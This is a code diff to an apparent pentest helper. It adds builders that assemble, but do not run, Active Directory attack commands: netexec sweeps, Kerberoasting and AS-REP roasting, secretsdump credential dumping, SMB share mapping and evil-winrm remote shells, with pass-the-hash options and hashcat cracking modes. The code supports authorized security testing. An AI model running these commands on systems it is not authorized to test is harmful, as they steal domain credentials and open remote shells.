@@ -173,6 +173,111 @@ def _build_amass(p: dict) -> str:
     return _cmd(parts)
 
 
+# --------------------------------------------------------------------------
+# AD / internal builders. Same rule as everything above: assemble a string,
+# execute nothing. These are the authenticated post-foothold tools a real
+# internal pentest reaches for — noisy and often logged, which is exactly why
+# they belong here (a copy-paste command the operator runs) and never on a
+# web button. A hash beats a password wherever both are offered (pass-the-hash).
+# --------------------------------------------------------------------------
+def _impacket_creds(p: dict) -> str:
+    """`DOMAIN/user:password` (or `DOMAIN/user` when a hash is supplied and
+    auth rides -hashes instead), as one shlex-quoted, inert argument."""
+    domain = _clean(p.get("domain")) or "<DOMAIN>"
+    user = _clean(p.get("login")) or "<USERNAME>"
+    if _clean(p.get("hash")):
+        return _q(f"{domain}/{user}")
+    pw = _clean(p.get("password")) or "<PASSWORD>"
+    return _q(f"{domain}/{user}:{pw}")
+
+
+def _impacket_hashes(p: dict) -> list[str]:
+    h = _clean(p.get("hash"))
+    return ["-hashes", _q(h)] if h else []
+
+
+def _build_netexec(p: dict) -> str:
+    proto = _clean(p.get("protocol")) or "smb"
+    if proto not in ("smb", "winrm", "ldap", "mssql", "ssh", "ftp", "rdp", "wmi"):
+        proto = "smb"
+    parts = ["nxc", shlex.quote(proto), _ph(p, "target", "TARGET"),
+             "-u", _ph(p, "login", "USERNAME")]
+    if _clean(p.get("hash")):
+        parts += ["-H", _q(p["hash"])]
+    else:
+        parts += ["-p", _ph(p, "password", "PASSWORD_OR_use_hash")]
+    if _clean(p.get("domain")):
+        parts += ["-d", _q(p["domain"])]
+    action = _clean(p.get("action"))
+    if action == "shares":
+        parts.append("--shares")
+    elif action == "users":
+        parts.append("--users")
+    elif action == "spider":
+        parts += ["-M", "spider_plus"]
+    return _cmd(parts)
+
+
+def _build_getuserspns(p: dict) -> str:
+    parts = ["GetUserSPNs.py", _impacket_creds(p)] + _impacket_hashes(p)
+    if _clean(p.get("dc_ip")):
+        parts += ["-dc-ip", _q(p["dc_ip"])]
+    parts += ["-request", "-outputfile", "kerberoast.hashes"]
+    return _cmd(parts)
+
+
+def _build_getnpusers(p: dict) -> str:
+    domain = _clean(p.get("domain")) or "<DOMAIN>"
+    if _clean(p.get("login")):
+        # Known credentials: enumerate the domain's AS-REP-roastable users.
+        parts = ["GetNPUsers.py", _impacket_creds(p)] + _impacket_hashes(p)
+    else:
+        # No creds: spray a username list with -no-pass (the classic AS-REP roast).
+        parts = ["GetNPUsers.py", _q(f"{domain}/"),
+                 "-usersfile", _ph(p, "userfile", "USERS_FILE"), "-no-pass"]
+    if _clean(p.get("dc_ip")):
+        parts += ["-dc-ip", _q(p["dc_ip"])]
+    parts += ["-request", "-format", "hashcat"]
+    return _cmd(parts)
+
+
+def _build_secretsdump(p: dict) -> str:
+    domain = _clean(p.get("domain")) or "<DOMAIN>"
+    user = _clean(p.get("login")) or "<USERNAME>"
+    host = _clean(p.get("target")) or "<TARGET_HOST>"
+    if _clean(p.get("hash")):
+        parts = ["secretsdump.py", _q(f"{domain}/{user}@{host}")] + _impacket_hashes(p)
+    else:
+        pw = _clean(p.get("password")) or "<PASSWORD>"
+        parts = ["secretsdump.py", _q(f"{domain}/{user}:{pw}@{host}")]
+    if _clean(p.get("dc_ip")):
+        parts += ["-dc-ip", _q(p["dc_ip"])]
+    return _cmd(parts)
+
+
+def _build_smbmap(p: dict) -> str:
+    parts = ["smbmap", "-H", _ph(p, "target", "TARGET")]
+    if _clean(p.get("login")):
+        parts += ["-u", _q(p["login"])]
+    if _clean(p.get("hash")):
+        parts += ["-p", _q(p["hash"])]   # smbmap takes LM:NT in -p for pass-the-hash
+    elif _clean(p.get("password")):
+        parts += ["-p", _q(p["password"])]
+    if _clean(p.get("domain")):
+        parts += ["-d", _q(p["domain"])]
+    return _cmd(parts)
+
+
+def _build_evilwinrm(p: dict) -> str:
+    parts = ["evil-winrm", "-i", _ph(p, "target", "TARGET"),
+             "-u", _ph(p, "login", "USERNAME")]
+    if _clean(p.get("hash")):
+        parts += ["-H", _q(p["hash"])]
+    else:
+        parts += ["-p", _ph(p, "password", "PASSWORD")]
+    return _cmd(parts)
+
+
 BUILDERS = {
     "hydra": {"build": _build_hydra, "desc": "Online login brute-force (many protocols).",
               "fields": ["target", "service", "login", "login_is_file", "password", "pass_is_file", "tasks"],
@@ -213,6 +318,38 @@ BUILDERS = {
               "0.0.0.0:4000 with no authentication (confirmed live on this box) and can outlive the command "
               "that started it. Run it yourself so you control when that's up — check "
               "`pgrep -af 'amass engine'` after and `pkill -f 'amass engine'` if you don't need it anymore."},
+
+    # ---- AD / internal (post-foothold, authenticated, noisy) ----
+    "netexec": {"build": _build_netexec, "desc": "netexec/nxc — authenticated sweep of a host or range over "
+                "smb/winrm/ldap/etc. Pick an action: --shares, --users, or spider (spider_plus module).",
+                "fields": ["protocol", "target", "login", "password", "hash", "domain", "action"],
+                "note": "Authenticated and LOUD — hits every host in the range and lands in Windows event logs. "
+                "Supply a password or an NT/LM hash (-H, pass-the-hash). Run it yourself."},
+    "getuserspns": {"build": _build_getuserspns, "desc": "impacket GetUserSPNs — Kerberoast: request TGS tickets "
+                    "for SPN-bearing accounts to crack offline.",
+                    "fields": ["domain", "login", "password", "hash", "dc_ip"],
+                    "note": "Authenticated (any domain user). -request pulls crackable tickets and is logged by the "
+                    "DC (event 4769). Feed the output to hashcat -m 13100. Run it yourself."},
+    "getnpusers": {"build": _build_getnpusers, "desc": "impacket GetNPUsers — AS-REP roast: pull hashes for "
+                   "accounts with Kerberos pre-auth disabled. Works with creds or a username list + -no-pass.",
+                   "fields": ["domain", "login", "password", "hash", "userfile", "dc_ip"],
+                   "note": "The no-creds (username-list) form is a pre-auth guess and shows up as failed logons on "
+                   "the DC. Crack results with hashcat -m 18200. Run it yourself."},
+    "secretsdump": {"build": _build_secretsdump, "desc": "impacket secretsdump — dump SAM/LSA/NTDS secrets "
+                    "(local hashes, or full domain hashes against a DC).",
+                    "fields": ["domain", "login", "password", "hash", "target", "dc_ip"],
+                    "note": "Highly privileged and highly logged — needs local admin (or DC access for DCSync). "
+                    "This is credential theft; only against systems you're authorized to test. Run it yourself."},
+    "smbmap": {"build": _build_smbmap, "desc": "smbmap — enumerate SMB shares and your access level on them "
+               "(read-only listing; no -x exec, no download built here).",
+               "fields": ["target", "login", "password", "hash", "domain"],
+               "note": "Authenticated share enumeration — quieter than the tools above but still a real logon. "
+               "Run it yourself."},
+    "evilwinrm": {"build": _build_evilwinrm, "desc": "evil-winrm — interactive WinRM (PowerShell) shell on a host, "
+                  "by password or NT hash (-H).",
+                  "fields": ["target", "login", "password", "hash"],
+                  "note": "This is an interactive shell, not a scan — needs WinRM (5985/5986) and a Remote "
+                  "Management user. Run it yourself."},
 }
 
 
